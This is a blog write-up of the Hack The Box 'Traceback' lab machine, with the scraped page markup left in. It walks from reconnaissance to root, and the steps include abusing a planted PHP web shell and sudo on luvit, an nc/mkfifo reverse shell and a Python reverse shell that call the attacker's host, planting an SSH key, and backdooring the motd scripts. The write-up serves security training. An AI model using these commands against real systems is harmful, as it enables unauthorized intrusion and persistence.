-rwxrwxr-x 1 root sysadmin 604 Aug 2 03:26 80-esm -rwxrwxr-x 1 root sysadmin 299 Aug 2 03:26 91-release-upgrade $ ls -al /var/backups/.update-motd.d total 32 drwxr-xr-x 2 root root 4096 Mar 5 02:56 . drwxr-xr-x 3 root root 4096 Aug 25 2019 .. -rwxr-xr-x 1 root root 981 Aug 25 2019 00-header -rwxr-xr-x 1 root root 982 Aug 27 2019 10-help-text -rwxr-xr-x 1 root root 4264 Aug 25 2019 50-motd-news -rwxr-xr-x 1 root root 604 Aug 25 2019 80-esm -rwxr-xr-x 1 root root 299 Aug 25 2019 91-release-upgrade We got write access to /etc/update-motd.d! It seems like the scripts in /etc/update-motd will be replaced with a clean version every now and then. Lets check if sshing into the box will cause these scripts to run. First I generate a ssh key-pair. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ ssh-keygen -t rsa Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): traceback/id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in traceback/id_rsa. Your public key has been saved in traceback/id_rsa.pub. The key fingerprint is: SHA256:CMKnVhw7VM+I3CeNzdMaP58KKe2K/r2pm585NpE8IcA root@kali The key&#39;s randomart image is: +---[RSA 3072]----+ | .o.. | | . +E= O . | | o X.= X . | | = o.+.= | | o .oSoo | | . .=. o . | | . +o o | | . =+= . | | .o.**O+. | +----[SHA256]-----+ Then, I copy the contents of my public key id_rsa.pub into sysadmin’s authorized_keys and ssh with the private key. 1 2 3 4 5 6 7 8 9 10 11 12 $ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCu/dvT4ATAAvV67Dzm8YNMfOzD1np26hbCDYbfgv9vltGcNsjqxw/ZOqiTtl6S88VX/VcmiVmbFB4KTZLFv4Sh+jJF5jhGwHDjE/pB2xNxFeyvr2DNSOU+810XAm15M7sMQUowLzikZgbfc/tYMZ7n8Bkd97smwnsCpS51NQjgOeAAAXmSxeSlHEokH4TFQXC5Xf1ApTnWMgxpf+mM675UQYhpgSA2uc6xjCGUjRJyTPHoItg+DpUytuMliPtgKLXovv7MSMVMbKXcUCv/eUDYYjPUcQc50VqziVAAh1SmBaIRtVu/2+9b4TfpR1YmAfC+ZOSPMbZYzbP2IeSW3/panAFzu/Z/K4t4W8YHU4hpOkm4+70A1+LQqiC/67fwdnWWX3Baw6Is3HDV7Uhsxg4ulFGqSPtdoSQYWir6ToC0eBfFHj05nTrHLi4FuJVQInMdLdErSA6eQpNyYwWYvTMD/l10m1SlV1dupyGSW65y+rbID6EKkR1sGGBTS2RB4eE= root@kali&quot; &gt;&gt; /home/sysadmin/.ssh/authorized_keys $ ssh -i id_rsa sysadmin@traceback.htb ################################# -------- OWNED BY XH4H --------- - I guess stuff could have been configured better ^^ - ################################# Welcome to Xh4H land Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings The line Welcome to Xh4H land was from 00-header! This means that since we can write to it and run any commands! 1 2 3 $ cat /etc/update-motd.d/00-header ... echo &quot;\\nWelcome to Xh4H land \\n&quot; Exploitation (2) Lets create a bash script that connects back to our nc listener on port 1338 and add it to 00-header. 1 2 3 4 $ cat /tmp/rev.sh python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.XX.XX&quot;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; $ chmod 777 /tmp/rev.sh $ echo &quot;/tmp/rev.sh&quot; &gt;&gt; /etc/update-motd.d/00-header And lastly, we simply start another ssh connection. 1 $ ssh -i id_rsa sysadmin@traceback.htb root.txt On our listener, we catch the connection and get the root flag. 1 2 3 4 5 $ nc -lvnp 1338 listening on [any] 1338 ... connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.181] 54618 root@traceback:/# cat /root/root.txt 05acXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !","url":"https://rizemon.github.io/posts/traceback-htb/","@type":"BlogPosting","headline":"Hack The Box - Traceback","dateModified":"2021-01-03T20:34:47+08:00","datePublished":"2020-08-16T13:31:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - Traceback | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">rizemon's blog</a></div><div class="site-subtitle font-italic">Cyber Security Enthusiast.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Traceback</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Traceback</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Aug 16, 2020, 1:31 PM +0800" > Aug 16, 2020 <i class="unloaded">2020-08-16T13:31:00+08:00</i> </span> by <span class="author"> rizemon </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 3, 2021, 8:34 PM +0800" > Jan 3, 2021 <i class="unloaded">2021-01-03T20:34:47+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1580 words">8 min</span></div></div><div class="post-content"><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/traceback.png" alt="" height="414px" width="615px" /></p><h1 id="configuration">Configuration</h1><p>The operating system that I will be using to tackle this machine is a Kali Linux VM.</p><p>What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.181 traceback.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</pre></table></code></div></div><h1 id="reconnaissance">Reconnaissance</h1><p>Using <code class="language-plaintext highlighter-rouge">nmap</code>, we are able to determine the open ports and running services on the machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> traceback.htb 
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-08-02 07:47 EDT
Nmap scan report <span class="k">for </span>traceback.htb <span class="o">(</span>10.10.10.181<span class="o">)</span>
Host is up <span class="o">(</span>0.0056s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 <span class="o">(</span>RSA<span class="o">)</span>
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Help us
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>7.03 seconds

</pre></table></code></div></div><h1 id="enumeration-1">Enumeration (1)</h1><p>Not much can be done with the <code class="language-plaintext highlighter-rouge">ssh</code> service on port <code class="language-plaintext highlighter-rouge">22</code>, so lets start with the <code class="language-plaintext highlighter-rouge">http</code> service on port <code class="language-plaintext highlighter-rouge">80</code>!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/traceback1.png" alt="" /></p><p>By viewing the source, we see something interesting.</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nt">&lt;center&gt;</span>
        <span class="nt">&lt;h1&gt;</span>This site has been owned<span class="nt">&lt;/h1&gt;</span>
        <span class="nt">&lt;h2&gt;</span>I have left a backdoor for all the net. FREE INTERNETZZZ<span class="nt">&lt;/h2&gt;</span>
        <span class="nt">&lt;h3&gt;</span> - Xh4H - <span class="nt">&lt;/h3&gt;</span>
        <span class="c">&lt;!--Some of the best web shells that you might need ;)--&gt;</span>
<span class="nt">&lt;/center&gt;</span>
</pre></table></code></div></div><p>The website has already been pwned? And what is with that comment? Searching “Some of the best web shells that you might need”, I came across a <a href="https://github.com/Xh4H/Web-Shells">repo</a> that was forked by <code class="language-plaintext highlighter-rouge">Xh4H</code>, which seems by the one that pwned the website.</p><p>In the repo was a list of ready-to-use web shells so I guess he must have uploaded one of this. Since the list was quite short, I manually tested each file and found that <code class="language-plaintext highlighter-rouge">smevk.php</code> existed on the web server.</p><p><code class="language-plaintext highlighter-rouge">http://traceback.php/smevk.php</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/traceback2.png" alt="" /></p><p>According to the source code in the repo, the username and password were both <code class="language-plaintext highlighter-rouge">admin</code>.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$UserName</span> <span class="o">=</span> <span class="s2">"admin"</span><span class="p">;</span>                                      <span class="c1">//Your UserName here.</span>
<span class="nv">$auth_pass</span> <span class="o">=</span> <span class="s2">"admin"</span><span class="p">;</span>                                  <span class="c1">//Your Password.</span>
</pre></table></code></div></div><p>After logging in, we see that the web shell is packed with many features such as file upload, command execution etc.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/traceback3.png" alt="" /></p><p>Using the command execution feature, I listed the home directories of users:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">ls</span> /home
sysadmin
webadmin
</pre></table></code></div></div><p>There is another user called <code class="language-plaintext highlighter-rouge">sysadmin</code> but all we could do is list the contents of <code class="language-plaintext highlighter-rouge">webadmin</code>’s home directory.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /home/webadmin
total 44
drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 04:03 <span class="nb">.</span>
drwxr-xr-x 4 root     root     4096 Aug 25  2019 ..
<span class="nt">-rw-------</span> 1 webadmin webadmin  105 Mar 16 04:03 .bash_history
<span class="nt">-rw-r--r--</span> 1 webadmin webadmin  220 Aug 23  2019 .bash_logout
<span class="nt">-rw-r--r--</span> 1 webadmin webadmin 3771 Aug 23  2019 .bashrc
drwx------ 2 webadmin webadmin 4096 Aug 23  2019 .cache
drwxrwxr-x 3 webadmin webadmin 4096 Aug 24  2019 .local
<span class="nt">-rw-rw-r--</span> 1 webadmin webadmin    1 Aug 25  2019 .luvit_history
<span class="nt">-rw-r--r--</span> 1 webadmin webadmin  807 Aug 23  2019 .profile
drwxrwxr-x 2 webadmin webadmin 4096 Aug  2 00:39 .ssh
<span class="nt">-rw-rw-r--</span> 1 sysadmin sysadmin  122 Mar 16 03:53 note.txt
</pre></table></code></div></div><p>There is a <code class="language-plaintext highlighter-rouge">note.txt</code>! Lets read it.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> /home/webadmin/note.txt
- sysadmin -
I have left a tool to practice Lua.
I<span class="s1">'m sure you know where to find it.
Contact me if you have any question.
</span></pre></table></code></div></div><p>A tool to practice Lua? I wasn’t sure what <code class="language-plaintext highlighter-rouge">sysadmin</code> was talking about but seeing in the home directory of <code class="language-plaintext highlighter-rouge">webadmin</code>, there was <code class="language-plaintext highlighter-rouge">.luvit_history</code>, which seems to be out of the norm. Searching online, it belonged to a program called <a href="https://luvit.io/"><code class="language-plaintext highlighter-rouge">Luvit</code></a>!</p><p>Running <code class="language-plaintext highlighter-rouge">sudo -l</code>, we see that we are able to run <code class="language-plaintext highlighter-rouge">luvit</code> as <code class="language-plaintext highlighter-rouge">sysadmin</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>webadmin on traceback:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User webadmin may run the following commands on traceback:
    <span class="o">(</span>sysadmin<span class="o">)</span> NOPASSWD: /home/sysadmin/luvit
</pre></table></code></div></div><p>Let see what we can do with it.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> sysadmin /home/sysadmin/luvit <span class="nt">-h</span>
Usage: /home/sysadmin/luvit <span class="o">[</span>options] script.lua <span class="o">[</span>arguments]

  Options:
    <span class="nt">-h</span>, <span class="nt">--help</span>          Print this <span class="nb">help </span>screen.
    <span class="nt">-v</span>, <span class="nt">--version</span>       Print the version.
    <span class="nt">-e</span> code_chunk       Evaluate code chunk and print result.
    <span class="nt">-i</span>, <span class="nt">--interactive</span>   Enter interactive repl after executing script.
    <span class="nt">-n</span>, <span class="nt">--no-color</span>      Disable colors.
    <span class="nt">-c</span>, <span class="nt">--16-colors</span>     Use simple ANSI colors
    <span class="nt">-C</span>, <span class="nt">--256-colors</span>    Use 256-mode ANSI colors
                        <span class="o">(</span>Note, <span class="k">if </span>no script is provided, a repl is run instead.<span class="o">)</span>
</pre></table></code></div></div><p>With the <code class="language-plaintext highlighter-rouge">-e</code> option, we can run put Lua code and it will run it as <code class="language-plaintext highlighter-rouge">sysadmin</code>! Since using <code class="language-plaintext highlighter-rouge">luvit</code> will be similar to using <code class="language-plaintext highlighter-rouge">lua</code>, I decided to follow <a href="https://gtfobins.github.io/gtfobins/lua/#shell">this</a> to see if we can run some arbitrary commands.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> sysadmin /home/sysadmin/luvit <span class="nt">-e</span> <span class="s1">'os.execute("id")'</span>
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>sysadmin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>sysadmin<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>sysadmin<span class="o">)</span>
<span class="nb">true</span>	<span class="s1">'exit'</span>	0
</pre></table></code></div></div><h1 id="exploitation-1">Exploitation (1)</h1><p>Nice! We managed to run commands as <code class="language-plaintext highlighter-rouge">sysadmin</code>. Lets spawn a reverse shell as <code class="language-plaintext highlighter-rouge">sysadmin</code>! After starting a <code class="language-plaintext highlighter-rouge">nc</code> listener on port <code class="language-plaintext highlighter-rouge">1337</code>, I ran the below command:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> sysadmin /home/sysadmin/luvit <span class="nt">-e</span> <span class="s1">'os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.XX.XX 1337 &gt;/tmp/f")'</span>
</pre></table></code></div></div><p>And I receive the connection:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1337
listening on <span class="o">[</span>any] 1337 ...
connect to <span class="o">[</span>10.10.XX.XX] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.181] 54078
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
</span></pre></table></code></div></div><h1 id="usertxt">user.txt</h1><p>With a stable shell, we can now read the user flag.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> /home/sysadmin/user.txt
7213XXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></table></code></div></div><h1 id="enumeration-2">Enumeration (2)</h1><p>I uploaded <a href="https://github.com/DominicBreuker/pspy"><code class="language-plaintext highlighter-rouge">pspy</code></a> to the box and ran it.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="nv">$ </span>wget http://10.10.XX.XX/pspy
<span class="nt">--2020-08-02</span> 02:59:49--  http://10.10.XX.XX/pspy
Connecting to 10.10.XX.XX:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1090528 <span class="o">(</span>1.0M<span class="o">)</span> <span class="o">[</span>application/octet-stream]
Saving to: <span class="s1">'pspy'</span>
...
2020-08-02 02:59:50 <span class="o">(</span>4.74 MB/s<span class="o">)</span> - <span class="s1">'pspy'</span> saved <span class="o">[</span>1090528/1090528]
<span class="nv">$ </span>./pspy
...
2020/08/02 03:03:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>9977   | /bin/sh <span class="nt">-c</span> <span class="nb">sleep </span>30 <span class="p">;</span> /bin/cp /var/backups/.update-motd.d/<span class="k">*</span> /etc/update-motd.d/
...
</pre></table></code></div></div><p>Every now and then, files from <code class="language-plaintext highlighter-rouge">/var/backups/.update-motd.d/</code> will be copied to <code class="language-plaintext highlighter-rouge">/etc/update-motd.d/</code>. Hmm lets check what permission we have on these folders.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /etc/update-motd.d/
total 32
drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 <span class="nb">.</span>
drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
<span class="nt">-rwxrwxr-x</span>  1 root sysadmin  981 Aug  2 03:26 00-header
<span class="nt">-rwxrwxr-x</span>  1 root sysadmin  982 Aug  2 03:26 10-help-text
<span class="nt">-rwxrwxr-x</span>  1 root sysadmin 4264 Aug  2 03:26 50-motd-news
<span class="nt">-rwxrwxr-x</span>  1 root sysadmin  604 Aug  2 03:26 80-esm
<span class="nt">-rwxrwxr-x</span>  1 root sysadmin  299 Aug  2 03:26 91-release-upgrade
<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /var/backups/.update-motd.d
total 32
drwxr-xr-x 2 root root 4096 Mar  5 02:56 <span class="nb">.</span>
drwxr-xr-x 3 root root 4096 Aug 25  2019 ..
<span class="nt">-rwxr-xr-x</span> 1 root root  981 Aug 25  2019 00-header
<span class="nt">-rwxr-xr-x</span> 1 root root  982 Aug 27  2019 10-help-text
